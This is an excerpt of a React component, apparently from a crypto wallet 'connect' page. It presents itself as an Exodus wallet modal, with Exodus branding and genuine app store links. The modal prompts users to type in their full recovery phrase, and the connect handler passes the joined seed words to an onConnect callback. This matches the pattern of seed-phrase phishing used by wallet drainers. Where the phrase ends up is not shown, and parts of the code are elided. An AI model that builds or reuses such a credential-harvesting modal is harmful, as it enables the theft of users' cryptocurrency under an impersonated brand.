...
export default function ExodusWalletModal({ onClose, onConnect, onBack }) {
  ...
  const handleConnect = () => {
    ...
    if (allValid) {
      onConnect('Exodus', seedWords.join(' '));
      onClose();
    }
  };
    ...
    <div className="modal-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="modal-content" style={{ maxWidth: 520 }}>
        <div className="modal-header" style={{ position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          ...
          <h2 style={{ margin: 0, textAlign: 'center' }}>Exodus</h2>
          ...
          {!showSeedInput ? (
            <>
              <div style={{ textAlign: 'center', marginBottom: 24 }}>
                <img src="/icons/exodus-logo.svg" alt="Exodus" style={{ width: 60, height: 60, margin: '0 auto 16px', display: 'block' }} />
                <p style={{ margin: 0, fontSize: 14, color: 'var(--text-dim)', lineHeight: 1.5 }}>
                  Get Exodus from the official website or mobile stores, then import your wallet with a recovery phrase.
                </p>
              </div>

              <div style={{ backgroundColor: 'rgba(255,255,255,0.05)', borderRadius: 12, padding: 20, marginBottom: 20 }}>
                <h3 style={{ margin: '0 0 16px 0', fontSize: 16, fontWeight: 600, color: 'var(--text)' }}>Get Exodus</h3>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
                  ...
                  <a
                    href="https://apps.apple.com/app/exodus-wallet/id1411715060"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                  ...
                  <a
                    href="https://play.google.com/store/apps/details?id=exodusmovement.exodus"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
